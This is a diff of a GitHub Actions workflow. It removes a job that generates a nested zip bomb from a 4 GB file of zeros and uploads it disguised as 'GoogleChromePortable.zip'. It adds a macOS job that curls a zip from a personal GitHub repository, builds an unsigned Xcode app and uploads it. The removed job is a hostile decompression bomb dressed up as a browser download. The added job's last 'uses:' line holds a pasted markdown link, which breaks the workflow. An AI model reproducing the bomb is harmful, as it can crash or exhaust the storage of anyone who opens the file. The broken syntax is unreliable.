@@ -1,112 +1,43 @@
-name: DO NOT CHECK ARTIFACTS AND UNZIP!!
+name: Mac Build CI via Curl
+
 on:
-  push:
-    branches: [ "main" ]
-  workflow_dispatch:
+  workflow_dispatch: # Allows you to manually trigger this build with a button click on GitHub
+
 jobs:
-  rush-e:
-    runs-on: ubuntu-latest
+  build-macos:
+    runs-on: macos-13
+
     steps:
-    - name: E
-      uses: actions/checkout@v4
-    - name: EE
-      # HOLY RUSH E REFERENCE COMING!1!11!!
-      run: |
-        mkdir rush_e&&cd rush_e
-        head -c 4294444444 /dev/zero|tr '\0' '0' > chrome.dll
-        7z a -tzip -mx=9 tabs.zip chrome.dll #1
-        7z a -tzip -mx=9 bookmarks.zip chrome.dll #2
-        7z a -tzip -mx=9 settings.zip chrome.dll #3
-        7z a -tzip -mx=9 extra.zip chrome.dll #4
-        7z a -tzip -mx=9 dino.zip chrome.dll #5
-        7z a -tzip -mx=9 ui.zip chrome.dll #5
-        7z a -tzip -mx=9 privacy.zip chrome.dll #6
-        7z a -tzip -mx=9 functions.zip chrome.dll #7
-        7z a -tzip -mx=9 htmls.zip chrome.dll #8
-        7z a -tzip -mx=9 dns.zip chrome.dll #9
-        7z a -tzip -mx=9 history.zip chrome.dll #10
-        7z a -tzip -mx=9 extensions.zip chrome.dll #11
-        7z a -tzip -mx=9 easter_eggs.zip chrome.dll #12
-        7z a -tzip -mx=9 https.zip chrome.dll #13
-        7z a -tzip -mx=9 http.zip chrome.dll #14
-        7z a -tzip -mx=9 video_player.zip chrome.dll #15
-        7z a -tzip -mx=9 audio.zip chrome.dll #16
-        rm chrome.dll
-        7z a -tzip -mx=9 domains.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #1
-        7z a -tzip -mx=9 javascript.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #2
-        7z a -tzip -mx=9 css.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #3
-        7z a -tzip -mx=9 protection.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #4
-        7z a -tzip -mx=9 import.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #5
-        7z a -tzip -mx=9 export.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #6
-        7z a -tzip -mx=9 profiles.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #7
-        7z a -tzip -mx=9 passwords.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #8
-        7z a -tzip -mx=9 autofill.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #9
-        7z a -tzip -mx=9 accessibility.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #10
-        7z a -tzip -mx=9 system.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #11
-        7z a -tzip -mx=9 sync.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #12
-        7z a -tzip -mx=9 thanos_snap.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #13
-        7z a -tzip -mx=9 zerg_rush.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #14
-        7z a -tzip -mx=9 atari_breakout.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #15
-        7z a -tzip -mx=9 google_gravity.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #16
-        rm tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip
-        7z a -tzip -mx=9 tabs.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #1
-        7z a -tzip -mx=9 bookmarks.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #2
-        7z a -tzip -mx=9 settings.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #3
-        7z a -tzip -mx=9 extra.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #4
-        7z a -tzip -mx=9 dino.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #5
-        7z a -tzip -mx=9 ui.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 privacy.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 functions.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 htmls.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 dns.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 history.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 extensions.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 easter_eggs.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 https.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 http.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 video_player.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 audio.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        rm domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 domains.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #1
-        7z a -tzip -mx=9 javascript.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #2
-        7z a -tzip -mx=9 css.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #3
-        7z a -tzip -mx=9 protection.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #4
-        7z a -tzip -mx=9 import.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #5
-        7z a -tzip -mx=9 export.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #6
-        7z a -tzip -mx=9 profiles.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #7
-        7z a -tzip -mx=9 passwords.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #8
-        7z a -tzip -mx=9 autofill.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #9
-        7z a -tzip -mx=9 accessibility.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #10
-        7z a -tzip -mx=9 system.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #11
-        7z a -tzip -mx=9 sync.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #12
-        7z a -tzip -mx=9 thanos_snap.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #13
-        7z a -tzip -mx=9 zerg_rush.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #14
-        7z a -tzip -mx=9 atari_breakout.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #15
-        7z a -tzip -mx=9 google_gravity.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip #16
-        rm tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip
-        7z a -tzip -mx=9 tabs.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #1
-        7z a -tzip -mx=9 bookmarks.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #2
-        7z a -tzip -mx=9 settings.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #3
-        7z a -tzip -mx=9 extra.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #4
-        7z a -tzip -mx=9 dino.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip #5
-        7z a -tzip -mx=9 ui.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 privacy.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 functions.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 htmls.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 dns.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 history.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 extensions.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 easter_eggs.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 https.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 http.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 video_player.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 audio.zip domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        rm domains.zip javascript.zip css.zip protection.zip import.zip export.zip profiles.zip passwords.zip autofill.zip accessibility.zip system.zip sync.zip thanos_snap.zip zerg_rush.zip atari_breakout.zip google_gravity.zip
-        7z a -tzip -mx=9 GoogleChromePortable.zip tabs.zip bookmarks.zip settings.zip extra.zip dino.zip ui.zip privacy.zip functions.zip htmls.zip dns.zip history.zip extensions.zip easter_eggs.zip https.zip http.zip video_player.zip audio.zip
-        mv GoogleChromePortable.zip ..
-    - name: EEE
-      uses: actions/upload-artifact@v7
-      with:
-        name: no_touchy_touchy
-        path: GoogleChromePortable.zip
-        archive: false
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # 1. This uses curl to download your source zip file from the internet
+      - name: Fetch Source Code via Curl
+        run: |
+          curl -L -o project_source.zip "https://raw.githubusercontent.com/c00lkiddpostshaxxs/random/main/HeliumLift-master.zip"
+
+      # 2. Extract the downloaded archive
+      - name: Unzip Source Code
+        run: |
+          unzip project_source.zip
+          ls -la  # Sanity check to confirm xcodeproj is visible
+
+      - name: Select Xcode Version
+        uses: maxim-lobanov/setup-xcode@v1
+        with:
+          xcode-version: '13.4.1'
+
+      - name: Clean and Compile App
+        run: |
+          xcodebuild clean build \
+            -project HeliumLift.xcodeproj \
+            -scheme HeliumLift \
+            -configuration Release \
+            MACOSX_DEPLOYMENT_TARGET=11.0 \
+            CODE_SIGNING_ALLOWED=NO
+
+      - name: Upload Compiled Binary Artifact
+        uses: [actions/upload-artifact@v4](https://github.com/actions/upload-artifact "actions/upload-artifact")
+        with:
+          name: HeliumLift-BigSur-Build
+          path: build/Release/HeliumLift.app
